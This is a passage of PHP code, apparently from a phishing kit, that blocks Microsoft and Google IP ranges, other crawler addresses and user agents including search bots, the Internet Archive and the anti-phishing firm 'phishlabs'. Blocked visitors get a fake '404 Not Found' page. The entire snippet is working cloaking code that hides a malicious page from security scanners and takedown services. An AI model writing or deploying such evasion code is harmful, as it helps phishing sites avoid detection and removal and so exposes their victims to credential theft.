"^65.55.92.184","^65.54.188.126","^65.55.37.88","^65.55.37.88","^65.55.92.136","^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104","^65.54.188.110", "^65.55.37.72", "^65.55.92.152", "^207.46.8.167", "^65.55.33.135","^134.170.2.199", "^65.55.85.12","^173.194.116.149","^216.58.211.37","^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*" ,"^216.33.229.163" ,"^64.233.173.*" , "^64.68.90.*","185.220.70.148","185.104.121.7");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}

if( !empty($_SERVER['HTTP_USER_AGENT']) ) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler","phishlabs");
    foreach($userAgents as $agent)
        if( strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false ) {
            header('HTTP/1.0 404 Not Found');
            exit;
      }}



?>